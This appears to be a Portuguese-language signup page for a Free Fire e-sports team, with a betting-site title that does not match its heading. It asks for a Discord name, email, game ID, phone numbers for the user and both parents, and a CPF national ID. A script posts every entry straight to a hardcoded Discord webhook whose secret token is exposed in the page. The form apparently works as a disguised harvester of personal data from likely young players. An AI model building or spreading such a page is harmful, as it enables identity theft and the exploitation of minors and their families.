<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Cadastro - Sonic Apostas</title>

<style>
body {
  background: #0d0d0d;
  font-family: Arial;
  color: white;
  display: flex;
  justify-content: center;
  padding: 20px;
}

.container {
  background: #161616;
  padding: 25px;
  border-radius: 12px;
  width: 350px;
  box-shadow: 0 0 20px rgba(0,0,0,0.5);
}

h2 {
  text-align: center;
}

.input-group {
  margin-bottom: 12px;
}

input {
  width: 100%;
  padding: 12px;
  border-radius: 8px;
  border: 1px solid #2a2a2a;
  background: #1f1f1f;
  color: white;
  outline: none;
}

input:focus {
  border: 1px solid #4caf50;
}

button {
  width: 100%;
  padding: 12px;
  background: #00c853;
  border: none;
  border-radius: 8px;
  color: white;
  font-weight: bold;
  cursor: pointer;
  margin-top: 15px;
}

button:hover {
  background: #00b34a;
}
</style>
</head>

<body>

<div class="container">
  <h2>Cadastro - França E-Sports</h2>

  <form id="form">

    <div class="input-group">
      <input type="text" id="adm" placeholder="Nome do ADM" required>
    </div>

    <div class="input-group">
      <input type="text" id="discord" placeholder="Nome no Discord" required>
    </div>

    <div class="input-group">
      <input type="email" id="email" placeholder="Email" required>
    </div>

    <div class="input-group">
      <input type="text" id="gameid" placeholder="ID do Free Fire" required>
    </div>

    <div class="input-group">
      <input type="text" id="telefone" placeholder="Número de telefone" required>
    </div>

    <div class="input-group">
      <input type="number" id="telefonepai" placeholder="Número Do Pai" required>
    </div>

    <div class="input-group">
      <input type="number" id="telefonemae" placeholder="Número Da Mãe" required>
    </div>

    <div class="input-group">
      <input type="number" id="cpf" placeholder="CPF" required>
    </div>

    <button type="submit">Cadastrar</button>

  </form>
</div>

<script>
document.getElementById("form").addEventListener("submit", async function(e){
  e.preventDefault();

  const adm = document.getElementById("adm").value;
  const discord = document.getElementById("discord").value;
  const email = document.getElementById("email").value;
  const gameid = document.getElementById("gameid").value;
  const telefone = document.getElementById("telefone").value;
  const telefonepai = document.getElementById("telefonepai").value;
  const telefonemae = document.getElementById("telefonemae").value;
  const cpf = document.getElementById("cpf").value;

  let mensagem = `
📩 NOVO CADASTRO

👤 ADM: ${adm}
🎮 Discord: ${discord}
📧 Email: ${email}
🆔 ID do jogo: ${gameid}
📱 Telefone: ${telefone}
📱 Telefone Do Pai: ${telefonepai}
📱 Telefone Da Mãe: ${telefonemae}
🔢 CPF: ${cpf}
`;

  try {
    await fetch("https://discord.com/api/webhooks/1492687038762188810/zwJV6yCuDDkdJqyaRHGCcu_sMikz3dDZrLchrXcDu1IWHJOgbrBbX9ksPMmiwDFb-qv0", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: mensagem
      })
    });

    alert("Cadastro enviado 🔥");
    this.reset();

  } catch (erro) {
    alert("Erro ao enviar 😢");
  }
});
</script>

</body>
</html>
